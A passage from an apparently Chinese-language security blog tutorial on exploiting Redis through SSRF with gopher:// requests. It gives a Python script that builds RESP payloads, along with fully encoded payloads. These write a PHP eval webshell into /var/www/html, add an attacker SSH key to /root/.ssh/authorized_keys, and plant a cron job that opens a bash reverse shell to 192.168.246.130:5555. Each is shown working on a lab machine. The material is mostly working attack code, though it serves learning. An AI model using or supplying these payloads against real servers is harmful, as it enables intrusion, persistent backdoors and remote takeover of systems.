     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到的payload如下，不过下面只进行了一次url编码，而如果我们利用的是ssrf的话，一般就要编码两次</p>
<pre class="line-numbers language-none"><code class="language-none">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%
0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
//二次编码后
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%2
53Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250A
dir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后在ssrf.php发送上述payload即可</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229142501547.png" alt="image-20231229142501547"></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229142516461.png" alt="image-20231229142516461"></p>
<p>服务端看到木马成功写入，下图验证成功</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229142530303.png" alt="image-20231229142530303"></p>
<p>在这里推荐一个工具，虽然之前的文章gopherus工具就可以打redis，不过感觉这个更专业</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LS95/gopher-redis-auth">gopher-redis-auth</a></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229143001471.png" alt="image-20231229143001471"></p>
<p>py2环境下运行，得到的内容记得二次编码发送</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229143034128.png" alt="image-20231229143034128"></p>
<p>依旧成功写入</p>
<h2 id="写ssh公钥">写ssh公钥</h2>
<p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code>；如果不存在，则可以利用<code>crontab</code>创建该目录</p>
<p>不过需要注意，这种方法需要确保靶机允许使用密钥登录。</p>
<p>开启方法：需要修改 ssh 配置文件 /etc/ssh/sshd_config</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#StrictModes yes</span>
改为
StrictModes no
然后重启sshd即可
/bin/systemctl restart  sshd.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们先直接尝试ssh登录靶机试试：</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229143701556.png" alt="image-20231229143701556"></p>
<p>可以看到是需要登录密码的，那我们开始攻击</p>
<h3 id="生成攻击机公钥">生成攻击机公钥</h3>
<p>这里呢我对公钥私钥的原理什么的忘记了，具体原理我认为可以参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/267701810">SSH 的原理与应用</a></p>
<p>其中对咱们这次的攻击思路有帮助的是</p>
<pre class="line-numbers language-none"><code class="language-none">使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。

所谓"公钥登录"，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。

这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个： $ ssh-keygen

运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。
运行结束以后，在~/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是公钥，后者是私钥。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这也就是说我们可以想办法将自己攻击机的公钥发送到对方服务器上，这样我们以后对其请求远程连接的时候就没必要输入密码了。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229144834957.png" alt="image-20231229144834957"></p>
<p>这里一路回车即可，最后进入/root/.ssh目录下即可看到公钥和私钥，如下图，前者为私钥，后者为公钥</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229145130446.png" alt="image-20231229145130446"></p>
<pre class="line-numbers language-none"><code class="language-none">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后我们修改一下上述脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
port<span class="token operator">=</span><span class="token string">"6379"</span>
shell<span class="token operator">=</span><span class="token string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali\n\n"</span>
filename<span class="token operator">=</span><span class="token string">"authorized_keys"</span>
path<span class="token operator">=</span><span class="token string">"/root/.ssh/"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//二次编码的结果</span>
gopher<span class="token operator">%</span><span class="token number">3</span>A<span class="token comment">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rs</span>
a<span class="token operator">%</span><span class="token number">2520</span>AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8<span class="token operator">%</span><span class="token number">252</span>BFZ3tPB8iivCWMCVFAAby4gH7GvL<span class="token operator">%</span><span class="token number">252</span>BDYQnOMQXsIbC3xrqQ<span class="token operator">%</span><span class="token number">252</span>BC6O<span class="token operator">/</span><span class="token number">4</span>T4VZey1e2JQ00O7<span class="token operator">%</span><span class="token number">252</span>B8Kl2gWuIkPyXK
KTXm88LOfYcARETlr20<span class="token operator">%</span><span class="token number">252</span>BINfJuzcb6ui1ZF<span class="token operator">%</span><span class="token number">252</span>BQnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA<span class="token operator">/</span>vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY<span class="token operator">%</span><span class="token number">252</span>BPV3d
zqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg<span class="token operator">%</span><span class="token number">252</span>BjmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4Te
GdbRaAcTuTkVLzBgJXDCA5n2hM<span class="token operator">%</span><span class="token number">253</span>D<span class="token operator">%</span><span class="token number">2520</span>root<span class="token operator">%</span><span class="token number">2540</span>kali<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252</span>A4<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25246</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Aconfig<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25243</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Aset<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25243</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Adir<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252411</span><span class="token operator">%</span><span class="token number">25</span>
<span class="token number">0</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252</span>A4<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25246</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Aconfig<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25243</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Aset<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252410</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Adbfilename<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252415</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Aauthorized_keys<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">252</span>A1<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span class="token operator">%</span><span class="token number">25244</span><span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>Asave<span class="token operator">%</span><span class="token number">250</span>D<span class="token operator">%</span><span class="token number">250</span>A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229145722322.png" alt="image-20231229145722322"></p>
<p>成功写入，接下来我们远程连接看看</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229145749212.png" alt="image-20231229145749212"></p>
<p>成功实现免密登录</p>
<h2 id="利用contrab计划任务反弹shell">利用contrab计划任务反弹shell</h2>
<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<p>由于系统的不同，crontrab定时文件位置也会不同</p>
<pre class="line-numbers language-none"><code class="language-none">Centos的定时任务文件在`/var/spool/cron/&lt;username&gt;`
Ubuntu定时任务文件在`/var/spool/cron/crontabs/&lt;username&gt;`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
<h3 id="构造payload-2">构造payload</h3>
<p>这里我再复习一波bash反弹命令的原理吧：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/<span class="token punctuation">[</span>ip<span class="token punctuation">]</span>/<span class="token punctuation">[</span>端口<span class="token punctuation">]</span> <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>/bin/bash -i 表示的是调用bash命令的交互模式，并将交互模式重定向到 /dev/tcp/[ip]/[端口] 中。这里我们将ip和端口改为我们攻击机的地址和监听端口。</p>
<p>重定向时加入一个描述符 &amp;，表示直接作为数据流输入。不加 &amp; 时，重定向默认是输出到文件里的。</p>
<p>/dev/tcp/ip地址/端口号 是linux下的特殊文件，表示对这个地址端口进行tcp连接</p>
<p>这里我们设置成攻击机监听的地址</p>
<p>最后面的 0&gt;&amp;1 。此时攻击机和靶机已经建立好了连接，当攻击机进行输入时，就是这里的 0（标准输入）</p>
<p>通过重定向符，重定向到 1（标准输出）中，由于是作为 /bin/bash 的标准输入，所以就执行了系统命令了。</p>
<p>接下来开始写入定时任务，构造redis的命令如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">flushall
set <span class="token number">1</span> <span class="token string single-quoted-string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n'</span>
config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>
config set dbfilename root
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>转化为redis RESP协议的格式，修改上述脚本即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
port<span class="token operator">=</span><span class="token string">"6379"</span>
shell<span class="token operator">=</span><span class="token string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>
filename<span class="token operator">=</span><span class="token string">"root"</span>
path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>二次编码后的结果如下</p>
<pre class="line-numbers language-none"><code class="language-none">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%252A/1
%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.246.130/5555%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D
%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A/var/spool/cron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>发送后，看一下靶机是否被成功写入</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229152354736.png" alt="image-20231229152354736"></p>
<p>接着攻击机开启监听，等一会儿即可。如下图成功拿到shell</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229152242287.png" alt="image-20231229152242287"></p>
<p>不过这里也可以用我推荐过的工具</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229152446308.png" alt="image-20231229152446308"></p>
<p>他这里默认监听端口为1234，需要注意一下，同样二次编码后看靶机，如下图成功写入</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229152024436.png" alt="image-20231229152024436"></p>
<p>成功那shell，不过这里这个工具是sh反弹，暂时也不知道这两种方式有何区别</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229151825806.png" alt="image-20231229151825806"></p>
<h1>0x05 Redis主从复制RCE</h1>
<p>这里搞着搞着就到了主从复制了，回想起之前搞这玩意儿弄得心烦，环境一直搞不好，看来是时候解决了~~</p>
<h2 id="介绍">介绍</h2>
<p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">PPT</a></p>
<h2 id="利用条件-2">利用条件</h2>
<p>□ 能未授权或者能通过弱口令认证访问到Redis服务器</p>
<p>□ 可动态修改备份文件路径</p>
<p>□ 主从未校验可信服务端</p>
<h2 id="主从复制概念">主从复制概念</h2>
